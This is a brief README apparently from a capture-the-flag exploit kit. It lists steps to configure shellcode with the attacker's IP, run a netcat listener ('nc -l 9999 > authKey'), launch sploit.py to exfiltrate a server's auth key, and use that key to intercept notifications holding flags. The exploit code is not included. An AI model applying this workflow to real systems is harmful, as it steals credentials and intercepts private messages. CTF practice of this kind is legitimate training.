How to hack:
1. fix ip address of server in sploit.py
2. change ip address to yours in shell.s
3. ./compile_shell.sh
4. run nc -l 9999 > authKey
5. ./sploit.py
6. xxd authKey - is stolen auth key
7. use auth key to intercept notifications, some of them contains flag
